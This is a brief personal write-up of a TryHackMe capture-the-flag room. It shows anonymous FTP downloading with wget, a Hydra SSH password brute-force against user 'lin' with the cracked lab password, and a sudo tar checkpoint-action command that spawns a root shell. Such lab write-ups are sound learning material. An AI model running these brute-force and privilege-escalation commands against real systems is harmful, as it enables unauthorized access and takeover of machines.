#ftp #hydra #wget

https://tryhackme.com/r/room/cowboyhacker

---
#### Nmap
![[Screenshot_2024-05-27_10-29-53.png]]

~~Ok so there is only one `/images` directory with one image `crew.jpg` in it, the `exiftool` gave me some hex's code to deal with, maybe~~

Ok the `Passive Mode` on ftp should be disabled by simply typing `passive` or by `wget`:
```shell
wget -m --no-passive ftp://anonymous@10.10.110.195
```

So I downloaded 2 files. The `locks.txt` give me a wordlist, probably passwords and `task.txt` give me a note with 2 names: `Vicious` and `lin`

I used hydra on a wordlist made with `cewl` but it was just `lin` the owner of the user account I bruteforced with `hydra`:
```shell
hydra -l 'lin' -P locks.txt ssh://10.10.110.195
```

The credentials are `lin:RedDr4gonSynd1cat3` 

And here I m in

The `sudo -l` gave me `tar`:
```shell
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

And here I m root

